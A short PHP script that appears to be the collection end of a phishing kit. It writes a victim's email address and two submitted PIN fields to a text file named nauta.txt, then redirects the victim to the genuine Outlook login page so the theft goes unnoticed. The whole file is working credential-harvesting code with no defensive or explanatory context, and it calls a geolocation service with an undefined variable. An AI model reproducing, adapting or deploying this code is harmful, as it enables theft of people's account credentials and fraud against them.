<?php
ini_set("display_errors", 0);
$ip = $_SERVER['REMOTE_ADDR'];

date_default_timezone_set('UTC');
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$userp));
@$pais = $meta['geoplugin_countryName']; 

if(isset($_POST['namee']) && isset($_POST['pwss'])){
  session_start();
$email=$_SESSION['mail'];
 $file = fopen("nauta.txt", "a");
fwrite($file, "correo: ".$email." - Pin1: ".$_POST['namee']." - REPETIR PIN : ".$_POST['pwss']." " . PHP_EOL . "*************************************" . PHP_EOL);
fclose($file);

Header ("Location: https://outlook.live.com/owa/");
}
else {
	header ('location: index.php');
}
?>
